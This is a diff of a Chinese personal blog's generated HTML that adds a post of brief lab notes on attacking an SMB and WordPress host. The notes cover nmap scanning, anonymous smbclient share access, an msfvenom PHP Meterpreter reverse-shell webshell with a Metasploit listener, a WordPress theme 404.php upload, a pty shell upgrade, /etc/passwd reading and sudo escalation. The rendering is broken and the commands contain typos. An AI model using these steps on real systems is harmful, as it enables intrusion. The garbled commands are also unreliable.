@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="笔记, 博客" />
+  <meta name="keywords" content="smb kali 安全," />
 
 
 
@@ -81,17 +81,18 @@
 
 
 
-<meta name="description" content="欢迎来到我的博客，虽然我很菜，但我会努力的。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="关于">
-<meta property="og:url" content="https://newird.github.io/about/index.html">
+<meta name="description" content="Smb (server message block)信息泄露信息探测-sV ip ```探测服务信息12345678910```namp -A -v -T4 ip``` 靶场全部信息,最大线程### 分析结果#### smb 弱点1. 空口令登录   ```smbclient -L ip    &apos;\\ip\print$&apos;```12```smbclient &amp;apos;\\ip\share$&amp;apo">
+<meta name="keywords" content="smb kali 安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="smb服务">
+<meta property="og:url" content="https://newird.github.io/2019/08/24/Smb (server message block)信息泄露/index.html">
 <meta property="og:site_name" content="各种笔记">
-<meta property="og:description" content="欢迎来到我的博客，虽然我很菜，但我会努力的。">
+<meta property="og:description" content="Smb (server message block)信息泄露信息探测-sV ip ```探测服务信息12345678910```namp -A -v -T4 ip``` 靶场全部信息,最大线程### 分析结果#### smb 弱点1. 空口令登录   ```smbclient -L ip    &apos;\\ip\print$&apos;```12```smbclient &amp;apos;\\ip\share$&amp;apo">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-09-22T14:06:07.315Z">
+<meta property="og:updated_time" content="2019-08-24T03:10:39.778Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="关于">
-<meta name="twitter:description" content="欢迎来到我的博客，虽然我很菜，但我会努力的。">
+<meta name="twitter:title" content="smb服务">
+<meta name="twitter:description" content="Smb (server message block)信息泄露信息探测-sV ip ```探测服务信息12345678910```namp -A -v -T4 ip``` 靶场全部信息,最大线程### 分析结果#### smb 弱点1. 空口令登录   ```smbclient -L ip    &apos;\\ip\print$&apos;```12```smbclient &amp;apos;\\ip\share$&amp;apo">
 
 
 
@@ -121,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://newird.github.io/about/"/>
+  <link rel="canonical" href="https://newird.github.io/2019/08/24/Smb (server message block)信息泄露/"/>
 
 
 
 
 
-  <title>关于 | 各种笔记</title>
+  <title>smb服务 | 各种笔记</title>
   
 
 
@@ -252,33 +253,180 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/24/Smb (server message block)信息泄露/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="newird">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种笔记">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">关于</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
+          <h1 class="post-title" itemprop="name headline">smb服务</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-24T11:06:59+08:00">
+                2019-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-        
-      </div>
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h1 id="Smb-server-message-block-信息泄露"><a href="#Smb-server-message-block-信息泄露" class="headerlink" title="Smb (server message block)信息泄露"></a>Smb (server message block)信息泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><figure class="highlight plain"><figcaption><span>-sV ip ```探测服务信息</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```namp -A -v -T4 ip``` 靶场全部信息,最大线程</span><br><span class="line"></span><br><span class="line">### 分析结果</span><br><span class="line"></span><br><span class="line">#### smb 弱点</span><br><span class="line"></span><br><span class="line">1. 空口令登录</span><br><span class="line"></span><br><span class="line">   ```smbclient -L ip</span><br></pre></td></tr></table></figure>
+   <figure class="highlight plain"><figcaption><span>'\\ip\print$'```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```smbclient &apos;\\ip\share$&apos;</span><br></pre></td></tr></table></figure>
+<p>   get 敏感文件</p>
+<ol start="2">
+<li><p>远程溢出漏洞分析</p>
+<figure class="highlight plain"><figcaption><span>asmba 查看版本号```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ## 针对http协议</span><br><span class="line"></span><br><span class="line">   1. 浏览器查看网站</span><br><span class="line">   2. 使用 dirb nikto探测</span><br><span class="line">   3. 寻找突破口,后台,传shell</span><br><span class="line"></span><br><span class="line">## 制作webshell</span><br><span class="line"></span><br><span class="line">```msfcvenom -p php/meterpreter/reverse_tcp lhost=攻击ip lhost=4444 -f raw &gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hander</span><br><span class="line">msf exploit(hander) &gt; set payload php/merterpreter/reverse_tcp</span><br><span class="line">msf exploit(hander) &gt; set host 攻击ip</span><br><span class="line">msf exploit(hander) &gt; set lport 4444</span><br><span class="line">msf exploit(hander) run</span><br></pre></td></tr></table></figure>
+<h2 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h2><p>找到敏感点</p>
+<p>wordpress 上传点 theme 404.php</p>
+<p>执行 <a href="http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php" target="_blank" rel="noopener">http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php</a></p>
+<h2 id="优化终端"><a href="#优化终端" class="headerlink" title="优化终端"></a>优化终端</h2><figure class="highlight python"><figcaption><span>-c 'import pty;pty.spawn("/bin/bash")'```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查找用户名 ```cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>在共享资源查找敏感文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su 用户名</span><br><span class="line">sudo -l </span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/smb-kali-安全/" rel="tag"># smb kali 安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/24/ssh泄露/" rel="next" title="ssh泄露">
+                <i class="fa fa-chevron-left"></i> ssh泄露
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -311,8 +459,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -412,6 +569,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Smb-server-message-block-信息泄露"><span class="nav-number">1.</span> <span class="nav-text">Smb (server message block)信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息探测"><span class="nav-number">1.1.</span> <span class="nav-text">信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#启动监听"><span class="nav-number">1.2.</span> <span class="nav-text">启动监听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传webshell"><span class="nav-number">1.3.</span> <span class="nav-text">上传webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#优化终端"><span class="nav-number">1.4.</span> <span class="nav-text">优化终端</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
